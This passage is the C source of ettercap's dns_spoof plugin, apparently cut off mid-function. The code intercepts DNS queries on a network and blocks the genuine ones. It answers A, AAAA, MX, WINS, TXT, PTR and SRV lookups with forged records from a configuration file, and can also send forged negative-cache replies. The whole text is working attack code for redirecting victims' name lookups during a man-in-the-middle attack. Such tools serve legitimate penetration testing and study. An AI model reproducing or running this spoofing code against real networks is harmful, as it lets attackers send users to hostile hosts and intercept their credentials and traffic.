/*
    dns_spoof -- ettercap plugin -- spoofs dns reply 

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_file.h>
#include <ec_hook.h>
#include <ec_resolv.h>
#include <ec_send.h>

#include <stdlib.h>
#include <string.h>

#ifndef ns_t_wins
#define ns_t_wins 0xFF01      /* WINS name lookup */
#endif

/* Maximum DNS TTL according to RFC 2181 = 2^31 - 1*/
#define MAX_DNS_TTL INT_MAX

/* globals */

struct dns_header {
   u_int16 id;                /* DNS packet ID */
#ifdef WORDS_BIGENDIAN
   u_char  qr: 1;             /* response flag */
   u_char  opcode: 4;         /* purpose of message */
   u_char  aa: 1;             /* authoritative answer */
   u_char  tc: 1;             /* truncated message */
   u_char  rd: 1;             /* recursion desired */
   u_char  ra: 1;             /* recursion available */
   u_char  unused: 1;         /* unused bits */
   u_char  ad: 1;             /* authentic data from named */
   u_char  cd: 1;             /* checking disabled by resolver */
   u_char  rcode: 4;          /* response code */
#else /* WORDS_LITTLEENDIAN */
   u_char  rd: 1;             /* recursion desired */
   u_char  tc: 1;             /* truncated message */
   u_char  aa: 1;             /* authoritative answer */
   u_char  opcode: 4;         /* purpose of message */
   u_char  qr: 1;             /* response flag */
   u_char  rcode: 4;          /* response code */
   u_char  cd: 1;             /* checking disabled by resolver */
   u_char  ad: 1;             /* authentic data from named */
   u_char  unused: 1;         /* unused bits */
   u_char  ra: 1;             /* recursion available */
#endif
   u_int16 num_q;             /* Number of questions */
   u_int16 num_answer;        /* Number of answer resource records */
   u_int16 num_auth;          /* Number of authority resource records */
   u_int16 num_res;           /* Number of additional resource records */
};

struct dns_spoof_entry {
   int   type;   /* ns_t_a, ns_t_mx, ns_t_ptr, ns_t_wins */
   u_int32 ttl; /* 0 - 2^31-1 seconds */
   char *name;
   struct ip_addr ip;
   u_int16 port;
   char *text;
   SLIST_ENTRY(dns_spoof_entry) next;
};

struct rr_entry {
   u_char *data;
   int size;
   SLIST_ENTRY(rr_entry) next;
};

static SLIST_HEAD(, dns_spoof_entry) dns_spoof_head;
static SLIST_HEAD(, rr_entry) answer_list;
static SLIST_HEAD(, rr_entry) authority_list;
static SLIST_HEAD(, rr_entry) additional_list;

/* protos */

int plugin_load(void *);
static int dns_spoof_init(void *);
static int dns_spoof_fini(void *);
static int dns_spoof_unload(void *);
static int load_db(void);
static int parse_line(const char *str, int line, int *type_p, char **ip_p, u_int16 *port_p, char **name_p, u_int32 *ttl_p);
static void dns_spoof(struct packet_object *po);
static int prepare_dns_reply(u_char *data, const char *name, int type, int *dns_len, int *n_answ, int *n_auth, int *n_addi);
static int get_spoofed_a(const char *a, struct ip_addr **ip, u_int32 *ttl);
static int get_spoofed_aaaa(const char *a, struct ip_addr **ip, u_int32 *ttl);
static int get_spoofed_txt(const char *name, char **txt, u_int32 *ttl);
static int get_spoofed_ptr(const char *arpa, char **a, u_int32 *ttl);
static int get_spoofed_mx(const char *a, struct ip_addr **ip, u_int32 *ttl);
static int get_spoofed_wins(const char *a, struct ip_addr **ip, u_int32 *ttl);
static int get_spoofed_srv(const char *name, struct ip_addr **ip, u_int16 *port, u_int32 *ttl);
char *type_str(int type);
static void dns_spoof_dump(void);

/* plugin operations */

struct plugin_ops dns_spoof_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "dns_spoof",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Sends spoofed dns replies",  
   /* the plugin version. */ 
   .version =           "1.3",
   /* activation function */
   .init =              &dns_spoof_init,
   /* deactivation function */                     
   .fini =              &dns_spoof_fini,
   /* clean-up function */
   .unload =            &dns_spoof_unload,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   /* load the database of spoofed replies (etter.dns) 
    * return an error if we could not open the file
    */
   if (load_db() != E_SUCCESS)
      return -E_INVALID;
   
   dns_spoof_dump();
   return plugin_register(handle, &dns_spoof_ops);
}

/*********************************************************/

static int dns_spoof_init(void *dummy) 
{
   /* variable not used */
   (void) dummy;

   /* 
    * add the hook in the dissector.
    * this will pass only valid dns packets
    */
   hook_add(HOOK_PROTO_DNS, &dns_spoof);
   
   return PLUGIN_RUNNING;
}


static int dns_spoof_fini(void *dummy) 
{
   /* variable not used */
   (void) dummy;

   /* remove the hook */
   hook_del(HOOK_PROTO_DNS, &dns_spoof);

   return PLUGIN_FINISHED;
}


/*
 * unload database list
 */
static int dns_spoof_unload(void *dummy)
{
   struct dns_spoof_entry *d;

   /* variable not used */
   (void) dummy;

   /* Free dynamically allocated memory */
   while (!SLIST_EMPTY(&dns_spoof_head)) {
      d = SLIST_FIRST(&dns_spoof_head);
      SLIST_REMOVE_HEAD(&dns_spoof_head, next);
      SAFE_FREE(d->name);
      SAFE_FREE(d->text);
      SAFE_FREE(d);
   }


   return PLUGIN_UNLOADED;
}


/*
 * load the database in the list 
 */
static int load_db(void)
{
   struct dns_spoof_entry *d;
   FILE *f;
   char line[100+255+10+1];
   char *ptr, *ip, *name;
   u_int32 ttl;
   int lines = 0, type;
   u_int16 port = 0;
   
   /* open the file */
   f = open_data("etc", ETTER_DNS, FOPEN_READ_TEXT);
   if (f == NULL) {
      USER_MSG("dns_spoof: Cannot open %s\n", ETTER_DNS);
      return -E_INVALID;
   }
         
   /* load it in the list */
   while (fgets(line, 100+255+10+1, f)) {
      /* count the lines */
      lines++;

      /* trim comments */
      if ( (ptr = strchr(line, '#')) )
         *ptr = '\0';

      /* skip empty lines */
      if (!*line || *line == '\r' || *line == '\n')
         continue;
      
      /* strip apart the line */
      if (!parse_line(line, lines, &type, &ip, &port,  &name, &ttl))
         continue;
        
      /* create the entry */
      SAFE_CALLOC(d, 1, sizeof(struct dns_spoof_entry));
      d->name = strdup(name);
      if (d->name == NULL) {
        USER_MSG("dns_spoof: Unable to allocate memory for d->name\n");
        return -E_INVALID;
      }
      d->type = type;
      d->port = port;
      d->text = NULL;
      d->ttl = ttl;

      /* convert the ip address */
      if (type == ns_t_txt) {
         /* Nothing to convert for TXT - just copy the string */
         d->text = strndup(ip, 255);
        if (d->text == NULL) {
           USER_MSG("dns_spoof: Unable to allocate memory for d->text\n");
           free(d->name);
           free(d);
           return -E_INVALID;
        }
      }
      else if (ip_addr_pton(ip, &d->ip) != E_SUCCESS) {
         /* neither IPv4 nor IPv6 - throw a message and skip line */
         USER_MSG("dns_spoof: %s:%d Invalid IPv4 or IPv6 address\n", ETTER_DNS, lines);
         SAFE_FREE(d);
         continue;
      }
        
      /* insert in the list */
      SLIST_INSERT_HEAD(&dns_spoof_head, d, next);
   }
   
   fclose(f);

   return E_SUCCESS;
}

/*
 * Parse line on format "<name> <type> <IP-addr> <ttl>".
 */
static int parse_line(const char *str, int line, int *type_p, char **ip_p, u_int16 *port_p, char **name_p, u_int32 *ttl_p)
{
   static char name[100+1];
   static char ip[MAX_ASCII_ADDR_LEN];
   static u_int16 port;
   static u_int32 ttl;
   char type[10+1];

   DEBUG_MSG("%s:%d str '%s'", ETTER_DNS, line, str); 

   /* Set default TTL of 1 hour if not specified */
   ttl = 3600;

   /* TTL is optional therefore only require 3 options here */
   if (sscanf(str,"%100s %10s %40[^\r\n# ] %u", name, type, ip, &ttl) < 3) {
      USER_MSG("dns_spoof: %s:%d Invalid entry '%s'\n", ETTER_DNS, line, str);
      return (0);
   }
   
   /* keep TTL within DNS standard limits (2^31 - 1) - see RFC 2181 */
   if (ttl > MAX_DNS_TTL) ttl = 3600;

   *ttl_p = ttl;

   if (!strcasecmp(type,"PTR")) {
      if (strpbrk(name,"*?[]")) {
         USER_MSG("dns_spoof: %s:%d Wildcards in PTR records are not allowed; %s\n",
                  ETTER_DNS, line, str);
         return (0);
      }
      *type_p = ns_t_ptr;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"A")) {
      *type_p = ns_t_a;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"AAAA")) {
      *type_p = ns_t_aaaa;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"MX")) {
      *type_p = ns_t_mx;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type,"WINS")) {
      *type_p = ns_t_wins;
      *name_p = name;
      *ip_p = ip;
      return (1);
   }

   if (!strcasecmp(type, "TXT")) {
      char txt[256];

      /* rescan line as spaces are supported in TXT records */
      if (sscanf(str,"%100s %10s \"%255[^\r\n#\"]\" %u", name, type, txt, &ttl) < 3) {
         USER_MSG("dns_spoof: %s:%d Invalid entry %s\n", ETTER_DNS, line, str);
         return 0;
      }

      if (ttl > MAX_DNS_TTL) ttl = 3600; /* keep TTL within DNS standard limits (2^31 - 1) - see RFC 2181 */

      *type_p = ns_t_txt;
      *name_p = name;
      *ip_p = txt;
      *ttl_p = ttl;
      return (1);
   }

   if (!strcasecmp(type, "SRV")) {
      /* 
       * SRV records have different syntax
       */
      static char ip_tmp[MAX_ASCII_ADDR_LEN];
      if (ec_strsplit_ipport(ip, ip_tmp, &port)) {
         USER_MSG("dns_spoof: %s:%d Unknown syntax for SRV record; %s\n",
                  ETTER_DNS, line, str);
         return (0);
      }

      *type_p = ns_t_srv;
      *name_p = name;
      *ip_p = ip_tmp;
      *port_p = port;
      return (1);
   }

   USER_MSG("dns_spoof: %s:%d Unknown record type %s\n", ETTER_DNS, line, type);
   return (0);
}

/*
 * parse the packet and send the fake reply
 */
static void dns_spoof(struct packet_object *po)
{
   struct dns_header *dns;
   struct rr_entry *rr;
   struct iface_env *iface;
   u_char *data, *end, *dns_reply;
   char name[NS_MAXDNAME];
   int name_len, dns_len, dns_off, n_answ, n_auth, n_addi;
   u_char *q;
   int16 class;
   u_int16 type;

   dns = (struct dns_header *)po->DATA.data;
   data = (u_char *)(dns + 1);
   end = (u_char *)dns + po->DATA.len;

   n_answ = 0;
   n_auth = 0;
   n_addi = 0;
   
   /* extract the name from the packet */
   name_len = dn_expand((u_char *)dns, end, data, name, sizeof(name));

   /* move pointer behind the domain name */
   q = data + name_len;
  
   /* get the type and class */
   NS_GET16(type, q);
   NS_GET16(class, q);

   /* set initial dns reply length to the length of the question */
   dns_len = q - data;

      
   /* handle only internet class */
   if (class != ns_c_in)
      return;

   /* we are interested only in DNS query */
   if ( (!dns->qr) && dns->opcode == ns_o_query && htons(dns->num_q) == 1 && htons(dns->num_answer) == 0) {

      /*
       * If we are interested in this DNS query this function returns E_SUCCESS.
       * The DNS reply data is stored in one or more of the single linked lists
       *  1. answer_list
       *  2. authority_list
       *  3. additional_list.
       * Below, the lists have to be processes in this order and concatenated to the
       * query in memory.
       */
      if (prepare_dns_reply(data, name, type, &dns_len, 
                            &n_answ, &n_auth, &n_addi) != E_SUCCESS)
         return;

      /* 
       * do nothing if we haven't prepared anything
       * this can happen with ANY queries 
       */
      if (dns_len <= q - data) 
         return;

      /* Do not forward query */
      po->flags |= PO_DROPPED; 

      /* set incoming interface as outgoing interface for reply */
      iface = po->flags & PO_FROMIFACE ? EC_GBL_IFACE : EC_GBL_BRIDGE;

      /* allocate memory for the dns reply */
      SAFE_CALLOC(dns_reply, dns_len, sizeof(u_int8));

      /* 
       * fill the buffer with the content of the request
       * we will append the answer just behind the request 
       */
      memcpy(dns_reply, data, q - data);
      dns_off = q - data;
      
      /* collect answers and free list items in one go */
      while (!SLIST_EMPTY(&answer_list)) {
         rr = SLIST_FIRST(&answer_list);
         /* make sure not to exceed allocated memory */ 
         if (dns_off + rr->size <= dns_len) {
            /* serialize data */
            memcpy(dns_reply + dns_off, rr->data, rr->size);
            dns_off += rr->size;
         }
         /* data not needed any longer - free it */
         SLIST_REMOVE_HEAD(&answer_list, next);
         SAFE_FREE(rr->data);
         SAFE_FREE(rr);
      }

      /* collect authority and free list items in one go */
      while (!SLIST_EMPTY(&authority_list)) {
         rr = SLIST_FIRST(&authority_list);
         /* make sure not to exceed allocated memory */ 
         if (dns_off + rr->size <= dns_len) {
            /* serialize data */
            memcpy(dns_reply + dns_off, rr->data, rr->size);
            dns_off += rr->size;
         }
         /* data not needed any longer - free it */
         SLIST_REMOVE_HEAD(&authority_list, next);
         SAFE_FREE(rr->data);
         SAFE_FREE(rr);
      }

      /* collect additional and free list items in one go */
      while (!SLIST_EMPTY(&additional_list)) {
         rr = SLIST_FIRST(&additional_list);
         /* make sure not to exceed allocated memory */ 
         if (dns_off + rr->size <= dns_len) {
            /* serialize data */
            memcpy(dns_reply + dns_off, rr->data, rr->size);
            dns_off += rr->size;
         }
         /* data not needed any longer - free it */
         SLIST_REMOVE_HEAD(&additional_list, next);
         SAFE_FREE(rr->data);
         SAFE_FREE(rr);
      }

      /* send the reply */
      send_dns_reply(iface, po->L4.src, &po->L3.dst, &po->L3.src, po->L2.src,
                  ntohs(dns->id), dns_reply, dns_len, n_answ, n_auth, n_addi);

      /* spoofed DNS reply sent - free memory */
      SAFE_FREE(dns_reply);

   }


}

/*
 * checks if a spoof entry extists for the name and type
 * the answer is prepared and stored in the global lists
 *  - answer_list
 *  - authority_list
 *  - additional_list
 */
static int prepare_dns_reply(u_char *data, const char *name, int type, int *dns_len, 
                             int *n_answ, int *n_auth, int *n_addi)
{
   struct ip_addr *reply;
   struct rr_entry *rr;
   bool is_negative;
   int len;
   u_int32 ttl, dns_ttl;
   u_char *answer, *p;
   char tmp[MAX_ASCII_ADDR_LEN];

   /* set TTL to 1 hour by default or in case something goes wrong */
   ttl = 3600;
   dns_ttl = htonl(ttl); /* reorder bytes for network stuff */

   /* by default we want to spoof actual data */
   is_negative = false;
   
   /* it is and address resolution (name to ip) */
   if (type == ns_t_a || type == ns_t_any) {

      /* found the reply in the list */
      if (get_spoofed_a(name, &reply, &ttl) != E_SUCCESS) {
          /* in case of ANY we have to proceed with the next section */
          if (type == ns_t_any)
            goto any_aaaa;
          else
            return -E_NOTFOUND;
      }

      /* check if the family matches the record type */
      if (ntohs(reply->addr_type) != AF_INET) {
         USER_MSG("dns_spoof: can not spoof A record for %s "
                  "because the value is not a IPv4 address\n", name);
         return -E_INVALID;
      }

      /* 
       * When spoofed IP address is undefined address, we stop
       * processing of this section by spoofing a negative-cache reply
       */
      if (ip_addr_is_zero(reply)) {
         /*
          * we want to answer this requests with a negative-cache reply
          * instead of spoofing a IP address
          */
         is_negative = true;

      } else {

         /* allocate memory for the answer */
         len = 12 + IP_ADDR_LEN;
         SAFE_CALLOC(answer, len, sizeof(u_char));
         p = answer;

         /* convert to network-byte order */
         dns_ttl = htonl(ttl);

         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
         memcpy(p + 2, "\x00\x01", 2);                    /* type A */
         memcpy(p + 4, "\x00\x01", 2);                    /* class */
         memcpy(p + 6, &dns_ttl, 4);                      /* TTL */
         memcpy(p + 10, "\x00\x04", 2);                   /* datalen */
         ip_addr_cpy(p + 12, reply);                      /* data */

         /* insert the answer into the list */
         SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
         rr->data = answer;
         rr->size = len;
         SLIST_INSERT_HEAD(&answer_list, rr, next);
         *dns_len += len;
         *n_answ += 1;

         USER_MSG("dns_spoof: %s [%s] spoofed to [%s] TTL [%u s]\n", 
               type_str(type), name, ip_addr_ntoa(reply, tmp), ttl);
      }
   } /* A */

any_aaaa:

   /* also care about AAAA records */
   if (type == ns_t_aaaa || type == ns_t_any) {

       /* found the reply in the list */
       if (get_spoofed_aaaa(name, &reply, &ttl) != E_SUCCESS) {
          /* in case of ANY we have to proceed with the next section */
          if (type == ns_t_any)
             goto any_mx;
          else
             return -E_NOTFOUND;
       }

       /* check if the family matches the record type */
       if (ntohs(reply->addr_type) != AF_INET6) {
          USER_MSG("dns_spoof: can not spoof AAAA record for %s "
                   "because the value is not a IPv6 address\n", name);
          return -E_INVALID;
       }

      /* 
       * When spoofed IP address is undefined address, we stop
       * processing of this section by spoofing a negative-cache reply
       */
      if (ip_addr_is_zero(reply)) {
         /*
          * we want to answer this requests with a negative-cache reply
          * instead of spoofing a IP address
          */
         is_negative = true;

      } else {

         /* allocate memory for the answer */
         len = 12 + IP6_ADDR_LEN;
         SAFE_CALLOC(answer, len, sizeof(u_char));
         p = answer;

         /* convert to network-byte order */
         dns_ttl = htonl(ttl);

         /* prepare the answer */
         memcpy(p, "\xc0\x0c", 2);             /* compressed name offset */
         memcpy(p + 2, "\x00\x1c", 2);         /* type AAAA */
         memcpy(p + 4, "\x00\x01", 2);         /* class IN */
         memcpy(p + 6, &dns_ttl, 4);           /* TTL */
         memcpy(p + 10, "\x00\x10", 2);        /* datalen */
         ip_addr_cpy(p + 12, reply);           /* data */

         /* insert the answer into the list */
         SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
         rr->data = answer;
         rr->size = len;
         SLIST_INSERT_HEAD(&answer_list, rr, next);
         *dns_len += len;
         *n_answ += 1;
         
         USER_MSG("dns_spoof: %s [%s] spoofed to [%s] TTL [%u s]\n", 
                  type_str(type), name, ip_addr_ntoa(reply, tmp), ttl);
      }
   } /* AAAA */

any_mx:

   /* it is an MX query (mail to ip) */
   if (type == ns_t_mx || type == ns_t_any) {
      
      /* found the reply in the list */
      if (get_spoofed_mx(name, &reply, &ttl) != E_SUCCESS) {
          /* in case of ANY we have to proceed with the next section */
          if (type == ns_t_any)
            goto any_wins;
          else
            return -E_NOTFOUND;
      }

      /* allocate memory for the answer */
      len = 12 + 2 + 7;
      SAFE_CALLOC(answer, len, sizeof(u_char));
      p = answer;

      /* convert to network-byte order */
      dns_ttl = htonl(ttl);

      /* prepare the answer */
      memcpy(p, "\xc0\x0c", 2);                          /* compressed name offset */
      memcpy(p + 2, "\x00\x0f", 2);                      /* type MX */
      memcpy(p + 4, "\x00\x01", 2);                      /* class */
      memcpy(p + 6, &dns_ttl, 4);                        /* TTL */
      memcpy(p + 10, "\x00\x09", 2);                     /* datalen */
      memcpy(p + 12, "\x00\x0a", 2);                     /* preference (highest) */
      /* 
       * add "mail." in front of the domain and 
       * resolve it in the additional record 
       * (here `mxoffset' is pointing at)
       */
      memcpy(p + 14, "\x04mail\xc0\x0c", 7); /* mx record */

      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&answer_list, rr, next);
      *dns_len += len;
      *n_answ += 1;
      
      /* add the additional record for the spoofed IPv4 address*/
      if (ntohs(reply->addr_type) == AF_INET) {

         /* allocate memory for the additional record */
         len = 17 + IP_ADDR_LEN;
         SAFE_CALLOC(answer, len, sizeof(u_char));
         p = answer;

         /* prepare the additinal record */
         memcpy(p, "\x04mail\xc0\x0c", 7);             /* compressed name offset */
         memcpy(p + 7, "\x00\x01", 2);                 /* type A */
         memcpy(p + 9, "\x00\x01", 2);                 /* class */
         memcpy(p + 11, &dns_ttl, 4);                  /* TTL */
         memcpy(p + 15, "\x00\x04", 2);                /* datalen */
         ip_addr_cpy(p + 17, reply);                   /* data */
      }
      /* add the additional record for the spoofed IPv6 address*/
      else if (ntohs(reply->addr_type) == AF_INET6) {

         /* allocate memory for the additional record */
         len = 17 + IP6_ADDR_LEN;
         SAFE_CALLOC(answer, len, sizeof(u_char));
         p = answer;

         /* prepare the additional record */
         memcpy(p, "\x04mail\xc0\x0c", 7);            /* compressed name offset */
         memcpy(p + 7, "\x00\x1c", 2);                /* type AAAA */
         memcpy(p + 9, "\x00\x01", 2);                /* class */
         memcpy(p + 11, &dns_ttl, 4);                 /* TTL */
         memcpy(p + 15, "\x00\x10", 2);               /* datalen */
         ip_addr_cpy(p + 17, reply);                  /* data */
      }
      else {
          /* IP address not valid - abort */
          return -E_INVALID;
      }

      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&additional_list, rr, next);
      *dns_len += len;
      *n_addi += 1;
      
      USER_MSG("dns_spoof: %s [%s] spoofed to [%s] TTL [%u s]\n", 
            type_str(type), name, ip_addr_ntoa(reply, tmp), ttl);

   } /* MX */

any_wins:

   /* it is an WINS query (NetBIOS-name to ip) */
   if (type == ns_t_wins || type == ns_t_any) {

      /* found the reply in the list */
      if (get_spoofed_wins(name, &reply, &ttl) != E_SUCCESS) {
          /* in case of ANY we have to proceed with the next section */
          if (type == ns_t_any)
            goto any_txt;
          else
            return -E_NOTFOUND;
      }

      if (ntohs(reply->addr_type) != AF_INET)
         /* XXX - didn't find any documentation about this standard
          * and if type WINS RR only supports IPv4 
          */
         return -E_INVALID;

      /* allocate memory for the answer */
      len = 12 + IP_ADDR_LEN;
      SAFE_CALLOC(answer, len, sizeof(u_char));
      p = answer;

      /* convert to network-byte order */
      dns_ttl = htonl(ttl);

      /* prepare the answer */
      memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
      memcpy(p + 2, "\xff\x01", 2);                    /* type WINS */
      memcpy(p + 4, "\x00\x01", 2);                    /* class IN */
      memcpy(p + 6, &dns_ttl, 4);                      /* TTL */
      memcpy(p + 10, "\x00\x04", 2);                   /* datalen */
      ip_addr_cpy((u_char*)p + 12, reply);             /* data */

      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&answer_list, rr, next);
      *dns_len += len;
      *n_answ += 1;
      
      USER_MSG("dns_spoof: %s [%s] spoofed to [%s] TTL [%u s]\n", 
            type_str(type), name, ip_addr_ntoa(reply, tmp), ttl);

   }

any_txt:

   /* it's a descriptive TXT record */
   if (type == ns_t_txt || type == ns_t_any) {
      char *txt;
      u_int8 txtlen;
      u_int16 datalen;

      /* found the reply in the list */
      if (get_spoofed_txt(name, &txt, &ttl) != E_SUCCESS) {
         /* in case of ANY we have to proceed with the next section */
         if (type == ns_t_any)
            goto exit;
         else
            return -E_NOTFOUND;
      }

      txtlen = strlen(txt);
      datalen = htons(txtlen + 1);

      /* allocate memory for the answer */
      len = 13 + txtlen;
      SAFE_CALLOC(answer, len, sizeof(u_char));
      p = answer;

      /* convert to network-byte order */
      dns_ttl = htonl(ttl);

      /* prepare the answer */
      memcpy(p,     "\xc0\x0c", 2);         /* compressed name offset */
      memcpy(p + 2, "\x00\x10", 2);         /* type TXT */
      memcpy(p + 4, "\x00\x01", 2);         /* class IN */
      memcpy(p + 6, &dns_ttl, 4);           /* TTL */
      memcpy(p + 10, &datalen, 2);          /* data len */
      memcpy(p + 12, &txtlen, 1);           /* TXT len */
      memcpy(p + 13, txt, txtlen);          /* string */

      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&answer_list, rr, next);
      *dns_len += len;
      *n_answ += 1;
      
      USER_MSG("dns_spoof: %s [%s] spoofed to \"%s\" TTL [%u s]\n", 
               type_str(type), name, txt, ttl);
   } /* TXT */

   /* it is a reverse query (ip to name) */
   if (type == ns_t_ptr) {
      
      u_char *answer, *p;
      char *a;
      u_char buf[256];
      int rlen;
      
      /* found the reply in the list */
      if (get_spoofed_ptr(name, &a, &ttl) != E_SUCCESS)
         return -E_NOTFOUND;

      /* compress the string into the buffer */
      rlen = dn_comp(a, buf, 256, NULL, NULL);

      /* allocate memory for the answer */
      len = 12 + rlen;
      SAFE_CALLOC(answer, len, sizeof(u_char)); 
      p = answer;

      /* convert to network-byte order */
      dns_ttl = htonl(ttl);

      /* prepare the answer */
      memcpy(p, "\xc0\x0c", 2);                        /* compressed name offset */
      memcpy(p + 2, "\x00\x0c", 2);                    /* type PTR */
      memcpy(p + 4, "\x00\x01", 2);                    /* class */
      memcpy(p + 6, &dns_ttl, 4);                      /* TTL */
      /* put the length before the dn_comp'd string */
      p += 10;
      NS_PUT16(rlen, p);
      p -= 12;
      memcpy(p + 12, buf, rlen);

      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&answer_list, rr, next);
      *dns_len += len;
      *n_answ += 1;
      
      USER_MSG("dns_spoof: %s [%s] spoofed to [%s] TTL [%u s]\n", 
            type_str(type), name, a, ttl);
      
   } /* PTR */

   /* it is a SRV query (service discovery) */
   if (type == ns_t_srv) {

      char tgtoffset[2];
      u_int16 port;
      int dn_offset = 0;


      /* found the reply in the list */
      if (get_spoofed_srv(name, &reply, &port, &ttl) != E_SUCCESS) 
         return -E_NOTFOUND;

      /* allocate memory for the answer */
      len = 24;
      SAFE_CALLOC(answer, len, sizeof(u_char));
      p = answer;

      /*
       * to refer the target to a proper domain name, we have to strip the
       * service and protocol label from the questioned domain name
       */
      dn_offset += *(data+dn_offset) + 1; /* first label (e.g. _ldap)*/
      dn_offset += *(data+dn_offset) + 1; /* second label (e.g. _tcp) */

      /* avoid offset overrun */
      if (dn_offset + 12 > 255) {
         dn_offset = 0;
      }

      tgtoffset[0] = 0xc0; /* offset byte */
      tgtoffset[1] = 12 + dn_offset; /* offset to the actual domain name */

      /* convert to network-byte order */
      dns_ttl = htonl(ttl);

      /* prepare the answer */
      memcpy(p, "\xc0\x0c", 2);                    /* compressed name offset */
      memcpy(p + 2, "\x00\x21", 2);                /* type SRV */
      memcpy(p + 4, "\x00\x01", 2);                /* class IN */
      memcpy(p + 6, &dns_ttl, 4);                  /* TTL */
      memcpy(p + 10, "\x00\x0c", 2);               /* data length */
      memcpy(p + 12, "\x00\x00", 2);               /* priority */
      memcpy(p + 14, "\x00\x00", 2);               /* weight */
      p+=16; 
      NS_PUT16(port, p);                           /* port */ 
      p-=18;             
      /* 
       * add "srv." in front of the stripped domain
       * name and resolve it in the additional 
       * record (here `srvoffset' is pointing at)
       */
      memcpy(p + 18, "\x03srv", 4);                /* target */
      memcpy(p + 22, tgtoffset, 2);                /* compressed name offset */
  
      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&answer_list, rr, next);
      *dns_len += len;
      *n_answ += 1;
      
      /* add the additional record for the spoofed IPv4 address */
      if (ntohs(reply->addr_type) == AF_INET) {

         /* allocate memory for the additional record */
         len = 16 + IP_ADDR_LEN;
         SAFE_CALLOC(answer, len, sizeof(u_char));
         p = answer;

         /* prepare the additional record */
         memcpy(p, "\x03srv", 4);                 /* target */
         memcpy(p + 4, tgtoffset, 2);             /* compressed name offset */
         memcpy(p + 6, "\x00\x01", 2);            /* type A */
         memcpy(p + 8, "\x00\x01", 2);            /* class */
         memcpy(p + 10, &dns_ttl, 4);             /* TTL */
         memcpy(p + 14, "\x00\x04", 2);           /* datalen */
         ip_addr_cpy(p + 16, reply);              /* data */
      }
      /* add the additional record for the spoofed IPv6 address*/
      else if (ntohs(reply->addr_type) == AF_INET6) {

         /* allocate memory for the additional record */
         len = 16 + IP6_ADDR_LEN;
         SAFE_CALLOC(answer, len, sizeof(u_char));
         p = answer;

         memcpy(p, "\x03srv", 4);                 /* target */
         memcpy(p + 4, tgtoffset, 2);             /* compressed name offset */
         memcpy(p + 6, "\x00\x1c", 2);            /* type AAAA */
         memcpy(p + 8, "\x00\x01", 2);            /* class */
         memcpy(p + 10, &dns_ttl, 4);             /* TTL */
         memcpy(p + 14, "\x00\x10", 2);           /* datalen */
         ip_addr_cpy(p + 16, reply);              /* data */
      }
      else {
          /* IP address not valid - abort */
          return -E_INVALID;
      }

      /* insert the answer into the list */
      SAFE_CALLOC(rr, 1, sizeof(struct rr_entry));
      rr->data = answer;
      rr->size = len;
      SLIST_INSERT_HEAD(&additional_list, rr, next);
      *dns_len += len;
      *n_addi += 1;
      
      USER_MSG("dns_spoof: %s [%s] spoofed to [%s:%d] TTL [%u s]\n", 
            type_str(type), name, ip_addr_ntoa(reply, tmp), port, ttl);
   } /* SRV */

   if (is_negative && type != ns_t_any) {

      /* allocate memory for authorative answer */
      len = 46;
      SAFE_CALLOC(answer, len, sizeof(u_char));
      p = answer;

      /* convert to network-byte order */
      dns_ttl = htonl(ttl);

      /* prepare the authorative record */
      memcpy(p, "\xc0\x0c", 2);                        /* compressed named offset */
      memcpy(p + 2, "\x00\x06", 2);                    /* type SOA */
      memcpy(p + 4, "\x00\x01", 2);                    /* class */
      memcpy(p + 6, &dns_ttl, 4);                      /* TTL (seconds) */
      memcpy(p + 10, "\x00\x22", 2);                   /* datalen */
      memcpy(p + 12, "\x03ns1", 4);                    /* primary server */
      memcpy(p + 16, "\xc0\x0c", 2);                   /* compressed name offeset */   
      memcpy(p + 18, "\x05""abuse", 6);                /* mailbox */
      memcpy(p + 24, "\xc0\x0c", 2);                   /* compressed name offset */
      memcpy(p + 26, "\x51\x79\x57\xf5", 4);           /* serial */
      memcpy(p + 30, "\x00\x00\x0e\x10", 4);           /* refresh interval */
      memcpy(p + 34, "\x00\x00\x02\x58", 4);           /* retry interval */
      memcpy(p + 38, "\x00\x09\x3a\x80", 4);           /* erpire limit */
      memcpy(p + 42, "\x00\x00\x00\x3c", 4);           /* minimum TTL */

      /* insert the answer into the list */
